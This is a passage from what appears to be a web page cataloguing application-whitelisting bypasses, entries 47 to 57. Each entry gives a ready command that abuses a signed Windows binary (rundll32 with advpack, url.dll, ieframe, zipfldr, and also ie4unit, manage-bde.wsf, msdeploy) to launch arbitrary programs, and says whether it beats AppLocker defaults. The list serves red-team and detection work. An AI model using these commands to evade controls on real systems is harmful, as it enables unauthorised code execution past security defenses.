href="https://gist.githubusercontent.com/bohops/693dd4d5dbfb500f1c3ace02622d5d34/raw/902ed953a9188b27e91c199b465cddf855c7b94f/test.inf">https://gist.githubusercontent.com/bohops/693dd4d5dbfb500f1c3ace02622d5d34/raw/902ed953a9188b27e91c199b465cddf855c7b94f/test.inf</a><br /><br /><br /><h2>47. Advpack.dll - RegisterOCX</h2><br /><code>rundll32.exe advpack.dll,RegisterOCX calc.exe<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: Yes<br />Notes:<br />• Links:• <a href="https://twitter.com/Moriarty_Meng/status/977848311603380224">https://twitter.com/Moriarty_Meng/status/977848311603380224</a><br /><br /><br /><h2>48. zipfldr.dll - RouteTheCall</h2><br /><code>rundll32.exe zipfldr.dll,RouteTheCall calc.exe<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: Yes<br />Notes:<br />• Links:• <a href="https://twitter.com/Moriarty_Meng/status/977848311603380224">https://twitter.com/Moriarty_Meng/status/977848311603380224</a><br /><br /><br /><h2>49. url.dll - OpenURL</h2><br /><code>rundll32.exe url.dll,OpenURL "C:\test\calc.hta"<br />rundll32.exe url.dll,OpenURL "C:\test\calc.url"<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/">https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/</a><br />• <a href="http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/">http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/</a><br /><br /><br /><h2>50. url.dll - FileProtocolHandler</h2><br /><code>rundll32.exe url.dll, FileProtocolHandler calc.exe<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/">http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/</a><br /><br /><br /><h2>51. ieframe.dll - OpenURL</h2><br /><code>rundll32.exe ieframe.dll,OpenURL "C:\test\calc.url"<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/">https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/</a><br />• <a href="http://www.hexacorn.com/blog/2018/03/15/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-5/">http://www.hexacorn.com/blog/2018/03/15/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-5/</a><br /><br /><br /><h2>52. shdocvw.dll - OpenURL</h2><br /><code>rundll32.exe shdocvw.dll,OpenURL "C:\test\calc.url"<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/">https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/</a><br />• <a href="http://www.hexacorn.com/blog/2018/03/15/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-5/">http://www.hexacorn.com/blog/2018/03/15/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-5/</a><br /><br /><br /><h2>53. ieadvpack.dll - LaunchINFSection</h2><br /><code>rundll32.exe ieadvpack.dll,LaunchINFSection test.inf,,1,<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/">https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/</a><br /><br /><br /><h2>54. ie4unit.exe</h2><br /><code>ie4unit.exe -BaseSettings<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: No<br />Notes: Requires to copy out ie4unit.exe and ieuinit.inf to a user controlled folder. Also need to add SCT in the MSIE4RegisterOCX.Windows7 section<br />• Links:• <a href="https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/">https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/</a><br /><br /><br /><h2>55. Visual Studio Tools for Office - .VSTO files</h2><br /><code>evilfile.vsto<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes: You need to build a solution using Visual Studio Tools for Office. User needs to confirm installation after executing.<br />• Links:• <a href="https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/">https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/</a><br /><br /><br /><h2>56. Manage-bde.wsf</h2><br /><code>cscript c:\windows\system32\manage-bde.wsf<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes: Need to adjust comspec variable using: set comspec=c:\windows\system32\calc.exe<br />• Links:• <a href="https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712">https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712</a><br />• <a href="https://twitter.com/bohops/status/980659399495741441">https://twitter.com/bohops/status/980659399495741441</a><br /><br /><br /><h2>57. msdeploy.exe</h2><br /><code>msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="c:\temp\bypass.exe &amp; pause"<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: Yes<br />Notes: Part of web deploy:<br />• <a href="https://www.iis.net/downloads/microsoft/web-deploy">https://www.iis.net/downloads/microsoft/web-deploy</a><br /><br />• Links:<br />• <a href="https://twitter.com/pabraeken/status/999090532839313408">https://twitter.com/pabraeken/status/999090532839313408</a><br /><br /></div></body></html>